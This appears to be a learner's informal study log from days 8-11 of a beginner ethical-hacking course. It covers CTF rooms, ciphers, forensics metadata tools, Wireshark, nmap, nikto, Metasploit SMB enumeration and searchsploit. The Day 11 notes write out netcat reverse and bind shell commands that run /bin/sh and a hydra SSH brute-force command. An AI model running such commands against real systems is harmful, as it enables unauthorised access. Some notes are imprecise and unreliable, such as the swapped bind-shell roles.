Following this path/roadmap for this week:
https://tryhackme.com/resources/blog/free_path


Day 8:
Practiced 3 CTF's on THM...Pickle Rick, Easy CTF, Bounty Hacker and Brute It.
I was able to figure out stuff to an extent without walkthroughs.
Also leant TMUX tool.


Day 9:
Learnt about different cryptographic algos, caesar, vignere ciphers, morse code, dec, hex, ascii, base32,base64
encoding and how to use them. solved 15 cryptography and 5 forensic challenges on pcio. Solved n completed krypton challenges
on overthewire. Great going!!:)
also studied symm n asymm encryption using public n pvt key.yet to learn rsa, aes those kinds of encryption n also hashing,
salting..etc..

Day 10:
Learnt about digital fornsics-investing crimes with digital evidence.Acquire evidence safely, chain of custody, transport to lab, make a 
copy and work on copy and process it.
pdfinfo document.pdf ..to find metadata in pdf
EXIF stands for Exchangeable Image File Format; it is a standard for saving metadata to image
exiftool image.jpg  ..to find meta data in image

Wireshark is an open-source, cross-platform network packet analyser tool capable of sniffing and investigating live traffic and inspecting packet captures (PCAP)
It only allows analysts to discover and investigate the packets in depth.
go to statistics, capture file data to see details abt pcap file
double click on packet to see osi model details
u can navigate to packets, mark/colour/comment them, export certain objects/packets, view in time format, filter packets, follow stream, extract 
certain files and analyze them! :)
Solved overpass2 a room in thm..i had to analyse tcp streams in wireshark and find the payload and take advantage of it
to crack passwords and login back secure the system.

Day 11:
PEH contd..
ping 8.8.8.8 ..if its old n ipconfig isnt there, ping from will be shown na, that is onli ip address
arp-scan -l :netdiscovery..ull find ur own ip address n vmware
netdiscover -r 192.168.231.0/24  ..sweeps all ip addresses across network
nmap -T4 -p- -A <ip address> -v
-sU scan top 1000 coz udp takes v long time for scan
-sS stealth scan
-sV version or service scan
 
 web enumeration:
 nikto -h https://ip address .. read result to see possible vulnerabilities like code execution, remote shell etc
 directory busting using dirb or gobuster
 dirb&
 use wordlists
 right click n view pg source codes like comments or passwd or users info retrieval
 use burpsuite ..modify post requests ..look at server header
 use wappalyzer installed..
 
 enumerating smb:it is like a file sharing llike google drive where all can upload  or see files
 metasploit: exploitation framework, auxilaary modules, info gathering, port scanning
 type mfsconsole in terminal
 in that: type:
 search smb
 use 60 or use auxillary/scanner/smb/smb_version
 info, options
 RHOST:remote host/victim/target ..in plural => can sweep a range
 set RHOSTS <ip>
 run
 note down all os versions n all in notepad its important
 smbclient -L \\\\\<ip>\\  ..-L to list files smbclient to connect to file share with anonymous access
 ADMIN$ and IPC$ ..admin file is valuable
 exit
 
 ssh <ip> ....offers something output..copy that
 ssh <ip> -oKexAlgorithms=+pastethat 
 gives cipher
 ssh <ip> -oKexAlgorithms=+pastethat -c pastecipher
 yes for fingerprinting
 
 based on what all u wrote down n versions n all, do research to find any vulnerabilities like cve for databases, openluck etc
 like on which port, which type of vulnerability like sqli, overflow etc
 searchsploit Samba 2.2.la //pput in terminal searchsploit is a tool
 
 vulnerabilty scanning using nessus:
 download nessus
 learn this par later properly
 
 
 Exploitation!!!! lezzgoooo
 shell:accesss to a machine
 revrse shell: victim connects to us
 target: nc <ip> 4444 -e /bin/sh  executes a bin shell ..linux in windows means .exe
 attackbox: nc -lvp 4444 ..listener is on prot 4444 verbose mode
 
 in bind shell: open up a port on machine by firing a port ..it listens to connect.. and build a shell
 attckbox: nc <ip>
 target: nc -lvp 4444 -e /bin/sh
 tcp connection on port 4444
 
 payload: when u run an exploit its called payload it can be windows,linux,python diff types 
 sent to victim, to attempt to get a shell on a machine
 non staged payload:large, sends exploit shell code all at once, wont work always like meterpreter_reverse_tcp
 staged:sends payload in stages, less stable extra / like meterpreter/reverse_tcp
 
 brute force attcks: hydra -l root -P /usr/share/wordlists/metasploit/filename.txt ssh ://192.120185.24:22 -t 4 -V ...4 threads port22, verbose mode, root username
 or u can search in metasploit: ssh,ssh_login,options,set pass_file /path , set rhosts <ip> , options to see all set, set threads 10, set verbose true, run

credential stuffing:injecting breached account credentials in hope of account takeover
